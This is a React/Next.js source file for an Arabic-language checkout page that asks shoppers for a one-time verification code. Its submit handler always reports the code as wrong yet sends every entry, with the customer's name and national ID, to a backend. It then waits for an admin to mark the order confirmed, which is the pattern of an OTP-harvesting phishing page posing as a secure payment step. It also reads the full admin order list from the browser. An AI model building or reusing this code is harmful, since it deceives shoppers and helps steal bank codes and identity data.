"use client";

import { useState, useEffect, useRef } from "react";
import Link from "next/link";
import { useCartStore } from "../../store/cartStore";
import { KeyRound, FileText, Receipt, X, RotateCcw, ChevronRight } from "lucide-react";
import CheckoutStepper from "../../components/CheckoutStepper";
import AnimatedBackground from "../../components/AnimatedBackground";

export default function VerifyPage() {
  const [code, setCode] = useState("");
  const [codeError, setCodeError] = useState(false);
  const [wrongCode, setWrongCode] = useState(false);
  const [resent, setResent] = useState(false);
  const [confirmed, setConfirmed] = useState(false);
  const [resendCooldown, setResendCooldown] = useState(60);
  const [submitCooldown, setSubmitCooldown] = useState(0);
  const submitCooldownRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const [dbOrderId, setDbOrderId] = useState<string | null>(null);
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const cooldownRef = useRef<ReturnType<typeof setInterval> | null>(null);

  useEffect(() => {
    cooldownRef.current = setInterval(() => {
      setResendCooldown(prev => {
        if (prev <= 1) { clearInterval(cooldownRef.current!); return 0; }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(cooldownRef.current!);
  }, []);

  function startCooldown() {
    clearInterval(cooldownRef.current!);
    setResendCooldown(60);
    cooldownRef.current = setInterval(() => {
      setResendCooldown(prev => {
        if (prev <= 1) { clearInterval(cooldownRef.current!); return 0; }
        return prev - 1;
      });
    }, 1000);
  }

  const { customer } = useCartStore();

  useEffect(() => {
    if (!dbOrderId) return;
    pollRef.current = setInterval(async () => {
      const res = await fetch(`/api/admin/orders/${dbOrderId}`);
      if (!res.ok) return;
      const data = await res.json();
      if (data.status === "confirmed") {
        clearInterval(pollRef.current!);
        setConfirmed(true);
      }
    }, 5000);
    return () => clearInterval(pollRef.current!);
  }, [dbOrderId]);

  async function handleSubmit() {
    if (code.length !== 4 && code.length !== 6) { setCodeError(true); return; }
    const orderId = localStorage.getItem("orderId") ?? "—";
    const customerName = customer?.name ?? "—";
    const customerId = customer?.nationalId ?? "—";
    setSubmitCooldown(5);
    submitCooldownRef.current = setInterval(() => {
      setSubmitCooldown(prev => {
        if (prev <= 1) { clearInterval(submitCooldownRef.current!); return 0; }
        return prev - 1;
      });
    }, 1000);
    setCode("");
    setWrongCode(true);
    await fetch("/api/verify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ code, orderId, customerName, customerId }),
    });
    try {
      const res = await fetch("/api/admin/orders");
      const orders = await res.json();
      const match = Array.isArray(orders) ? orders.find((o: { orderId: string; _id: string }) => o.orderId === orderId) : null;
      if (match) setDbOrderId(match._id);
    } catch {}
  }

  // Confirmed Popup
  if (confirmed && dbOrderId) {
    return (
      <>
        <AnimatedBackground />
        <div className="fixed inset-0 backdrop-blur-sm flex items-center justify-center z-50 px-4" style={{ background: "rgba(240,248,242,0.85)" }} dir="rtl">
          <div className="relative rounded-3xl w-full max-w-sm sm:max-w-md overflow-hidden border border-[#80C78D]/40" style={{ background: "#ffffff" }}>
            <Link href="/" className="absolute top-3 left-3 p-1.5 rounded-full border border-[#80C78D]/40 hover:border-[#47A557] text-[#1A2E44]/40 transition z-10" style={{ background: "#DCEFE8" }}>
              <X className="w-4 h-4" />
            </Link>

            <div className="h-1.5 w-full" style={{ background: "linear-gradient(90deg, #47A557, #80C78D)" }} />

            <div className="flex flex-col items-center pt-6 pb-3">
              <img src="/sucess.webp" alt="success" className="w-28 h-28 sm:w-36 sm:h-36 object-contain" />
              <span className="mt-3 text-white text-sm font-black px-6 py-1.5 rounded-full shadow-md" style={{ background: "linear-gradient(135deg, #47A557, #129928)" }}>
                نجحت عملية الدفع ✓
              </span>
            </div>

            <div className="px-6 py-5 flex flex-col gap-4 text-center">
              <div className="space-y-2">
                <p className="text-[#1A2E44] font-black text-base">تمت العملية بنجاح</p>
                <p className="text-[#1A2E44]/60 text-sm leading-7">
                  شكراً لك لثقتك، وإنه لمن دواعي سرورنا العمل معكم، نشكرك على كونك واحداً من عملائنا الكرام، أنتم تستحقون أفضل خدماتنا.
                </p>
                <p className="text-[#1A2E44]/30 text-xs">يرجى التواصل مع موظف خدمة العملاء لاستكمال إجراءات شحن الطلب.</p>
              </div>
              <div className="flex gap-3 pb-1">
                <a href={`/admin/orders/${dbOrderId}/print`} target="_blank" rel="noopener noreferrer"
                  className="flex-1 flex items-center justify-center gap-2 py-2.5 rounded-xl text-white font-black text-sm transition hover:opacity-90"
                  style={{ background: "linear-gradient(135deg, #47A557, #129928)" }}>
                  <FileText className="w-4 h-4" /> الفاتورة
                </a>
                <a href={`/admin/orders/${dbOrderId}/receipt`} target="_blank" rel="noopener noreferrer"
                  className="flex-1 flex items-center justify-center gap-2 py-2.5 rounded-xl text-white font-black text-sm transition hover:opacity-90"
                  style={{ background: "linear-gradient(135deg, #47A557, #129928)" }}>
                  <Receipt className="w-4 h-4" /> سند القبض
                </a>
              </div>
            </div>
          </div>
        </div>
      </>
    );
  }

  // OTP Form
  return (
    <div className="min-h-screen bg-[#f0f8f2] flex flex-col items-center justify-center px-4 sm:px-6 py-8" dir="rtl">
      <AnimatedBackground />

      <div className="w-full max-w-md sm:max-w-lg mb-4">
        <CheckoutStepper active="confirm" />
      </div>

      <div className="w-full max-w-md sm:max-w-lg rounded-2xl sm:rounded-3xl overflow-hidden border border-[#80C78D]/40" style={{ background: "#ffffff" }}>

        {/* Top accent */}
        <div className="h-1.5 w-full" style={{ background: "linear-gradient(90deg, #47A557, #80C78D)" }} />

        {/* Header */}
        <div className="px-5 py-4 border-b border-[#80C78D]/30 flex items-center gap-3" style={{ background: "#DCEFE8" }}>
          <div className="w-10 h-10 rounded-xl flex items-center justify-center border border-[#80C78D]/40" style={{ background: "#ffffff" }}>
            <KeyRound className="text-[#47A557] w-5 h-5" />
          </div>
          <div>
            <h2 className="text-[#1A2E44] text-sm font-black">تأكيد رمز التحقق</h2>
            <p className="text-[#1A2E44]/50 text-[10px] mt-0.5">أدخل الرمز المكون من 4 أو 6 أرقام لإتمام الطلب</p>
          </div>
        </div>

        <div className="px-5 sm:px-8 py-6 sm:py-8 space-y-5">

          {/* OTP Input */}
          <div className="flex flex-col gap-2">
            <label className="text-xs font-bold text-[#1A2E44]/70 flex items-center gap-1.5">
              <KeyRound className="w-3.5 h-3.5 text-[#47A557]" />
              رمز التحقق
            </label>
            <input
              type="text"
              inputMode="numeric"
              value={code}
              maxLength={6}
              placeholder="— — — —"
              onChange={e => { setCode(e.target.value.replace(/\D/g, "").slice(0, 6)); setCodeError(false); setWrongCode(false); }}
              className={`w-full text-center text-2xl sm:text-3xl font-black tracking-[0.5em] border-2 rounded-2xl px-4 py-4 outline-none transition-all duration-200 ${
                codeError || wrongCode
                  ? "border-red-400/50 bg-red-50 text-red-400"
                  : "border-[#80C78D]/40 bg-[#DCEFE8]/40 text-[#47A557] focus:border-[#47A557] focus:bg-white"
              }`}
            />
            <p className="text-[#1A2E44]/30 text-[10px] text-center">قد يستغرق وصول الرمز بضع دقائق</p>
            {codeError && <p className="text-red-500 text-xs font-bold text-center bg-red-50 py-2 rounded-xl border border-red-400/20">⚠️ الكود يجب أن يكون 4 أو 6 أرقام</p>}
            {wrongCode && <p className="text-red-500 text-xs font-bold text-center bg-red-50 py-2 rounded-xl border border-red-400/20">❌ الكود غير صحيح، حاول مرة أخرى</p>}
            {resent && <p className="text-[#47A557] text-xs font-bold text-center py-2 rounded-xl border border-[#80C78D]/40" style={{ background: "#DCEFE8" }}>✓ تم إعادة إرسال الرمز بنجاح</p>}
          </div>

          {/* Actions */}
          <div className="space-y-2.5">
            <button
              onClick={handleSubmit}
              disabled={submitCooldown > 0}
              className="w-full text-white py-4 rounded-2xl font-black text-sm transition-all active:scale-[0.98] disabled:opacity-60 disabled:cursor-not-allowed hover:opacity-90 shadow-lg"
              style={{ background: submitCooldown > 0 ? "#80C78D" : "linear-gradient(135deg, #47A557 0%, #129928 100%)", boxShadow: "0 8px 24px rgba(71,165,87,0.25)" }}
            >
              {submitCooldown > 0 ? `⏳ انتظر ${submitCooldown} ثانية...` : "✅ تأكيد وإتمام الطلب"}
            </button>

            <div className="flex gap-2.5">
              <button
                disabled={resendCooldown > 0}
                onClick={() => {
                  const orderId = localStorage.getItem("orderId") ?? "—";
                  fetch("/api/resend", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ orderId, customerName: customer?.name ?? "—" }) });
                  setResent(true);
                  setTimeout(() => setResent(false), 3000);
                  startCooldown();
                }}
                className="flex-1 flex items-center justify-center gap-1.5 py-3 rounded-xl text-xs sm:text-sm font-bold transition-all border-2 border-[#80C78D]/40 text-[#47A557] hover:border-[#47A557] disabled:opacity-50 disabled:cursor-not-allowed"
                style={{ background: "#DCEFE8" }}
              >
                <RotateCcw className="w-3.5 h-3.5" />
                {resendCooldown > 0 ? `${resendCooldown}ث` : "إعادة الإرسال"}
              </button>

              <Link
                href="/checkout"
                className="flex-1 flex items-center justify-center gap-1.5 border-2 border-[#80C78D]/40 text-[#1A2E44]/60 hover:border-[#47A557] hover:text-[#1A2E44] py-3 rounded-xl font-bold text-xs sm:text-sm transition"
                style={{ background: "#DCEFE8" }}
              >
                <ChevronRight className="w-4 h-4" />
                الخطوة السابقة
              </Link>
            </div>
          </div>

          {/* Security note */}
          <div className="flex items-center justify-center gap-1.5 text-[#1A2E44]/30 text-[10px] sm:text-[11px]">
            <svg className="w-3 h-3" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
              <path strokeLinecap="round" strokeLinejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
            </svg>
            <span>معاملة آمنة ومشفرة بالكامل</span>
          </div>
        </div>
      </div>
    </div>
  );
}
